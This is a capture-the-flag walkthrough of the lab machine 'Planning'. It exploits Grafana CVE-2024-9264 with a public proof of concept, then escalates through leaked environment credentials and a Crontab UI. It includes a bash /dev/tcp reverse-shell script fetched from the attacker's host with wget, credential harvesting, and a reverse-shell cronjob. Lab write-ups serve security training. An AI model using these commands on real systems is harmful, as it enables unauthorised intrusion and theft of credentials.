---
hidden: true
---

# Planning

## Machine info

Starting credentials: `admin:0D5oT70Fq13EvB5r`

## Port scanning

```bash
nmap -T5 -sV -p- --open -oN port_scan.txt 10.10.11.68 -Pn

Nmap scan report for 10.10.11.68
Host is up (0.037s latency).
Not shown: 61891 closed tcp ports (reset), 3642 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

I tried to find some dir or juicy file but i didn't find nothing.&#x20;

### Virtual Host Subdomain enumeration

The site is in HTTP protocol and i tried to perform a Vhost enumeration with `wfuzz` and i found a juicy subdomain.

{% code title="wfuzz " overflow="wrap" %}
```bash
wfuzz -H "Host: FUZZ.planning.htb" --hc 404,403,301 -H "User-Agent: PENTEST" -c -z file,"/usr/share/amass/wordlists/bitquark_subdomains_top100K.txt" http://planning.htb/

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000024093:   302        2 L      2 W        29 Ch       "grafana"   
```
{% endcode %}

Change the `Host` header to `grafana.planning.htb` and follow the redirect

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Change the `/etc/hosts` file with new subdomain to view it.

<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>



Viewing the bottom of the page we can see the **Grafana version** installed.

The version 11.0.0 seems vulnerabile to CVE-2024-9264 (Grafana Post-Auth DuckDB SQL Injection (RCE, File Read))

### CVE-2024-9264 Grafana Post-Auth DuckDB SQL Injection (RCE, File Read)

{% embed url="https://github.com/nollium/CVE-2024-9264" %}

Follow the github PoC

<pre class="language-bash" data-title="Exploit installation"><code class="lang-bash">git clone https://github.com/nollium/CVE-2024-9264
cd CVE-2024-9264
<strong>python3 -m venv CVE-2024-9264
</strong>source CVE-2024-9264/bin/activate
pip install -r requirments.txt
</code></pre>

Try to exploit this vulnerability to read a file with user privide at the inizial part of this box.

{% code overflow="wrap" %}
```bash
python3 CVE-2024-9264.py -u 'admin' -p '0D5oT70Fq13EvB5r'  -f /etc/passwd  http://grafana.planning.htb
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

And then, try to test RCE vulnerability

{% code overflow="wrap" %}
```bash
python3 CVE-2024-9264.py -u 'admin' -p '0D5oT70Fq13EvB5r'  -c id  http://grafana.planning.htb
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Now, we can transfer a simple reverse shell to machine with this command.&#x20;

{% code title="rev.sh" %}
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.111/9009 0>&1
```
{% endcode %}

{% code title="Start http server" %}
```bash
# on kali machine
python3 -m http.server 80
```
{% endcode %}

{% code overflow="wrap" %}
```bash
python3 CVE-2024-9264.py -u 'admin' -p '0D5oT70Fq13EvB5r'  -c "wget http://10.10.14.111/rev.sh"  http://grafana.planning.htb
```
{% endcode %}

## Reverse shell&#x20;

Once we have the rev.sh file, configure a listener and run it on target machine.

{% code title="Start Penelope listener" %}
```bash
penelope
listeners add 10.10.14.111 9009
```
{% endcode %}

{% code title="Run the rev shell" overflow="wrap" %}
```bash
# give permission
python3 CVE-2024-9264.py -u 'admin' -p '0D5oT70Fq13EvB5r'  -c "chmod +x rev.sh"  http://grafana.planning.htb

# run the shell
python3 CVE-2024-9264.py -u 'admin' -p '0D5oT70Fq13EvB5r'  -c "./rev.sh"  http://grafana.planning.htb
```
{% endcode %}

From the name of the machine we can get that we are in a docker container.

## Privilege Escalation for User.flag

### Use LinPeas

{% code title="" overflow="wrap" %}
```bash
wget http://10.10.14.111/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
{% endcode %}

LinPeas juicy things discovers:

### Admin creds in VarEnv

#### GF admin user and password

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

### User.flag

&#x20;Access through SSH with the credentials found in the environment variables.

```bash
ssh enzo@10.10.11.68
RioTecRANDEntANT!
```

Print the user flag

```bash
cat /home/enzo/user.txt
```



## Privilege Escalation for Root.flag

Now that we have a SSH connection to target machine, we can transfer a linpeas.sh script and run it to find some juicy things.

{% code title="Attack machine" %}
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
```
{% endcode %}

{% code title="Target machine" %}
```bash
cd /tmp
wget http://10.10.14.110/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
{% endcode %}

### crontab.db file

I found this file inder the `/opt/crontabs/`

{% code title="crontabs.db" overflow="wrap" %}
```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}

{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
{% endcode %}

Inside this file there is the password of grafana backups.

### Port Forwarding

Running Linpeas we can notice that the target machine has some ports hosted in local:

<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

We can do a Local port forwarding to check those ports.

```bash
ssh -L 8080:127.0.0.1:8000 enzo@10.10.11.68
RioTecRANDEntANT!
```

When i enter in the browser with my local port i obtain this:

<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

We can try to make access with credentials founds in the `crontabs.db` file as root user.

```
root:P4ssw0rdS0pRi0T3c
```

Now we can access to the Crontab UI interface:

<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

Add a cronjob to stablish a connection with a reverse shell

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

Start a listener port and run the cronjob

```bash
nc -lnvp 9099
```

<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

### Root.flag

```bash
cat /root/root.txt
```



Keep learning!!
